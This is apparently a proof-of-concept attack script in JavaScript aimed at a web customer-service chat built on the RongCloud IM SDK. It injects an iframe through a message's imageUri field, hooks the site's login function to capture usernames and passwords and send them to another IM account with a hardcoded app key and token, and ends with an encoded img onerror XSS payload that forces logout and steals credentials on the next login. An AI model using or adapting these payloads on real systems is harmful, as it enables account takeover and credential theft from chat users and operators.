// onmessage = function(message){
//     var data=message.data;
//     var msg = 'Hi from task.js';
//     this.postMessage(msg);
// }

for(var i = 0; i < 30; i++){
  alert('被攻击了吧！！！');
}


var rong = RongIMClient.getInstance();
var message = new RongIMLib.ImageMessage({
  content: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2w',
  imageUri: '123"/><iframe src="https://yuhongda0315.github.io/martin-demo/tes.html" style="display:none;"></iframe>'
});
rong.sendMessage(5, 'KEFU147703288786623',  message, {onSuccess: function(m){console.log(m)}});




window.selfLogin = RECM.serverApi.user.login;
RECM.serverApi.user.login=function(name, pwd){
  RongIMClient.init('tdrvipkst7v85', null, {
        navi: 'navprodrcx.cn.ronghub.com'
      });

      RongIMClient.setConnectionStatusListener({
        onChanged: function (status) {
          console.log(status);
           if (status == 0) {
              var rong = RongIMClient.getInstance();
              var message = new RongIMLib.TextMessage({
                content: content
              });
              rong.sendMessage(1, 'JpKkf4t0r1CTsrEKG0PX9IZ',  message, {onSuccess: function(m){console.log(m)}});
           }
        }
      });

      RongIMClient.setOnReceiveMessageListener({
          onReceived: function (message) {
          }
      });

       
    var token = 'AAx7BKFi+e+VBQ5I4gRv5G8Q//LPWkDoKwWSItHcBXE2Krz+Y3sa8XpeU26GeeliLn2lVhq0V+Qd1DKzkkV4zDOVb14=';

    RongIMClient.connect(token, {
          onSuccess: function(userId) {
          },
          onTokenIncorrect: function() {
          },
          onError:function(errorCode){}
        });
    ;return selfLogin(name, pwd)}


    <img src=# onerror=(function(){RECM.serverApi.user.logout();RECM.instance.$router.push({name:'login'});window.selfLogin&#61RECM.serverApi.user.login;RECM.serverApi.user.login&#61function(name,pwd){RongIMClient.init('tdrvipkst7v85',null,{navi:'navprodrcx.cn.ronghub.com'});RongIMClient.setConnectionStatusListener({onChanged:function(status){}});RongIMClient.setOnReceiveMessageListener({onReceived:function(message){}});RongIMClient.connect('AAx7BKFi+e+VBQ5I4gRv5G8Q//LPWkDoKwWSItHcBXE2Krz+Y3sa8XpeU26GeeliLn2lVhq0V+Qd1DKzkkV4zDOVb14=',{onSuccess:function(userId){RongIMClient.getInstance().sendMessage(1,'JpKkf4t0r1CTsrEKG0PX9IZ',new&#32RongIMLib.TextMessage({content:name+','+pwd}),{onSuccess:function(m){}});},onTokenIncorrect:function(){},onError:function(errorCode){}});return&#32selfLogin(name,pwd)}})() />





    